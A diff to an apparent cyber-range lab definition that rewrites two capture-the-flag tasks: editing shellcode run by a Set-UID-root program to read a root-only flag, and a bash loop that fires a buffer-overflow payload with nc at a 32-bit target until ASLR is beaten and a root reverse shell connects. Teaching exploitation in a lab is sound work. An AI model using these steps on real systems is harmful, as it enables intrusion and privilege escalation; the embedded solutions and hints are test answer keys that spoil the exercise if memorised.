@@ -34,26 +34,26 @@
       "local_content": "This sandbox has not been tested for use with a local sandbox."
     },
     {
-      "title": "Task 1 - Get familiar with the shellcode",
+      "title": "Task 1 - Shellcode & Set-UID: read the protected flag",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "execve",
-      "answer_variable_name": null,
-      "content": "The goal of a code-injection attack is to run **shellcode** - a small piece of machine code that launches a shell - using the privilege of the vulnerable program.\n\nThe shellcode is provided for you in `~/shellcode`. Build and test it:\n\n```\nuser@attacker:~$ cd ~/shellcode\nuser@attacker:~/shellcode$ ./shellcode_32.py   # writes codefile_32\nuser@attacker:~/shellcode$ ./shellcode_64.py   # writes codefile_64\nuser@attacker:~/shellcode$ make                # builds a32.out and a64.out\nuser@attacker:~/shellcode$ ./a32.out           # runs the 32-bit shellcode\nuser@attacker:~/shellcode$ ./a64.out           # runs the 64-bit shellcode\n```\n\nOpen `shellcode_32.py` and read how the shellcode launches `/bin/bash -c` with a command string. Try changing that command string (keep the total length identical by adjusting spaces before the `*` marker), regenerate the code file, and run it again to confirm your command executes.\n\n**Flag:** the shellcode ends by invoking a single system call that replaces the current process image with a shell. Submit the **name of that system call**.",
-      "solution": "The 32-bit shellcode sets `eax = 0x0b` (11) and triggers `int 0x80`; syscall 11 on x86 is `execve`. The flag is `execve`.",
+      "answer": null,
+      "answer_variable_name": "flag_task1",
+      "content": "Shellcode is a small piece of machine code that launches a shell - and it runs with the privilege of the program that executes it. In this task you use that to read a file your own account cannot.\n\nThe flag is stored in **`/opt/flag`**, owned by **root** with mode `0400`, so as `user` you are denied:\n\n```\nuser@attacker:~$ cat /opt/flag\ncat: /opt/flag: Permission denied\n```\n\nBut you are given a **Set-UID-root runner**, `~/shellcode/run-shellcode`. A Set-UID program runs with the privilege of its **owner** (root), not yours - and `run-shellcode` executes whatever shellcode you put in `codefile_32`. So any command your shellcode runs will run **as root**. (The provided shellcode already begins with a `setuid(0)` call, so the `bash` it launches keeps root instead of dropping it.)\n\nSteps, in `~/shellcode`, using only the 32-bit generator `shellcode_32.py`:\n\n```\nuser@attacker:~/shellcode$ nano shellcode_32.py     # set the command string to:  cat /opt/flag\nuser@attacker:~/shellcode$ ./shellcode_32.py        # writes codefile_32 (the shellcode bytes)\nuser@attacker:~/shellcode$ ./run-shellcode          # Set-UID root: runs your shellcode as root\nFLAG-T1-xxxxxxxxxxxxxxxx\n```\n\nEdit only the command-string line (the one ending with the `*` marker) so the command is `cat /opt/flag`, keeping the `*` in the **same column** (pad with spaces). Leave the machine-code bytes and the `AAAA/BBBB/CCCC/DDDD` argv slots untouched.\n\n**Flag:** the contents of `/opt/flag`, printed when your shellcode runs through the Set-UID runner. Typing `cat /opt/flag` yourself will not work - only the Set-UID path can read it.",
+      "solution": "/opt/flag is root-only (mode 0400), so `user` cannot read it directly. Edit the command string in shellcode_32.py to `cat /opt/flag` (keep the `*` in the same column), run `./shellcode_32.py` to write codefile_32, then run the Set-UID-root `./run-shellcode`. Because run-shellcode is Set-UID root and the shellcode calls setuid(0) first, the launched bash runs as root and `cat /opt/flag` prints the flag (a per-sandbox FLAG-T1-... value). Running your own non-Set-UID a32.out, or typing `cat /opt/flag` in your shell, both run as `user` and are denied.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Where to look",
-          "content": "A shell is started by replacing the running process with a new program. The family of system calls that does this starts with `exec`.",
+          "title": "Why your shell is denied",
+          "content": "/opt/flag is owned by root with mode 0400, so your `user` account cannot read it. You need a process that runs as root - that is what the Set-UID runner `run-shellcode` gives you.",
           "hint_penalty": 0.5,
           "order": 0
         },
         {
-          "title": "The exact name",
-          "content": "On Linux, the system call that loads and runs a new program image (used by the shellcode via `int 0x80`, eax=11) is `execve`.",
+          "title": "Make the shellcode read it",
+          "content": "Set the command-string line in shellcode_32.py to `cat /opt/flag` (keep the `*` in the same column), run `./shellcode_32.py`, then execute `./run-shellcode` (not your own a32.out) to run the shellcode as root.",
           "hint_penalty": 1,
           "order": 1
         }
@@ -61,7 +61,7 @@
       "incorrect_answer_limit": 10,
       "attachments": [],
       "max_score": 3,
-      "variant_answers": false,
+      "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
@@ -142,28 +142,34 @@
       "commands_required": false
     },
     {
-      "title": "Task 6 - Address randomization (ASLR)",
+      "title": "Task 4 - Defeating Address Randomization",
       "level_type": "TRAINING_LEVEL",
       "order": 5,
-      "estimated_duration": 10,
+      "estimated_duration": 20,
       "minimal_possible_solve_time": null,
-      "answer": "2",
-      "answer_variable_name": null,
-      "content": "Your attacks worked because **ASLR (Address Space Layout Randomization)** is disabled on the target. Confirm it: connect to Level 1 several times and watch the leaked buffer address.\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\n```\n\nThe buffer address is **the same every time** - so the fixed return address in your payload always lands. With ASLR enabled, that address would change on each run, and a single hard-coded return address would almost always miss (on 32-bit it can still be brute-forced thanks to the small entropy; on 64-bit it becomes impractical).\n\nASLR is controlled by the kernel parameter `kernel.randomize_va_space`:\n* `0` = off (current state)\n* `1` = partial\n* `2` = full randomization\n\n**Flag:** submit the value of `kernel.randomize_va_space` that enables **full** address-space randomization.",
-      "solution": "`sudo sysctl -w kernel.randomize_va_space=2` enables full ASLR. The flag is `2`. With full randomization the stack base changes every execution, so a hard-coded return address no longer reliably points into the NOP sled.",
+      "answer": null,
+      "answer_variable_name": "flag_level3",
+      "content": "The Task 4 target is a **separate** container at **`10.1.26.9:9092`**. It runs the **same 32-bit vulnerable program as Level 1** (Task 2), but with one crucial difference: **ASLR (Address Space Layout Randomization) is enabled** on it. Levels 1 and 2 had it off, which is why a single fixed return address always worked.\n\nProbe it and reconnect a few times:\n\n```\n$ echo hello | nc 10.1.26.9 9092\n$ echo hello | nc 10.1.26.9 9092\n```\n\nThis time the leaked **buffer address changes on every connection** - so your fixed `ret` from Task 2 usually misses and you see `==== Returned Properly ====` or a crash.\n\nBut on 32-bit Linux the stack has only **19 bits of entropy**, so the stack base has just `2^19 = 524,288` possibilities - small enough to **brute-force**. Keep the **same badfile from Task 2** (do not recompute it) and fire it in a loop until one attempt happens to line the stack up with your hard-coded return address. The provided `~/attack-code/brute-force.sh` does exactly this:\n\n```bash\n#!/bin/bash\nSECONDS=0\nvalue=0\nwhile true; do\n  value=$(( value + 1 ))\n  echo \"$(($SECONDS/60)) min $(($SECONDS%60)) sec elapsed; attempt $value\"\n  cat badfile | nc 10.1.26.9 9092\ndone\n```\n\nSet up your `nc -lnv 4444` listener first (as in Task 2), then run the script and wait. On a 32-bit target a hit usually lands within minutes; the shellcode runs and the root reverse shell connects. Then read this container's own flag:\n\n```\nroot@...:/# cat /root/flag\n```\n\n**Flag:** the contents of `/root/flag` on the Task 4 (`:9092`) target.",
+      "solution": "The `:9092` container runs the Level 1 binary with ASLR **on**, so the stack base is randomized on every run and a fixed return address rarely hits. On 32-bit there are only `2^19 = 524288` possible stack bases, so brute force works: enable `nc -lnv 4444`, keep the unchanged Task 2 badfile, and loop it against `10.1.26.9:9092` with `~/attack-code/brute-force.sh`. Within minutes one run lines the stack up with the hard-coded return address, the shellcode executes, and the reverse shell connects. Then `cat /root/flag` for this container's unique flag. (On 64-bit the entropy is far larger, making this brute force impractical.)",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "The parameter values",
-          "content": "`kernel.randomize_va_space` takes 0 (off), 1 (partial) or 2 (full). You want full randomization.",
+          "title": "Why your old payload misses",
+          "content": "This container has ASLR enabled, so the leaked buffer address is different on every connection and your fixed `ret` only occasionally lands. You do not need a new payload - you need many attempts.",
           "hint_penalty": 0.5,
           "order": 0
+        },
+        {
+          "title": "Brute-forcing it",
+          "content": "32-bit has only 19 bits of entropy (2^19 = 524288 possibilities). Start `nc -lnv 4444`, keep the SAME badfile from Task 2, and loop it against port 9092 with `~/attack-code/brute-force.sh` until the reverse shell connects, then `cat /root/flag`.",
+          "hint_penalty": 1,
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
       "max_score": 4,
-      "variant_answers": false,
+      "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
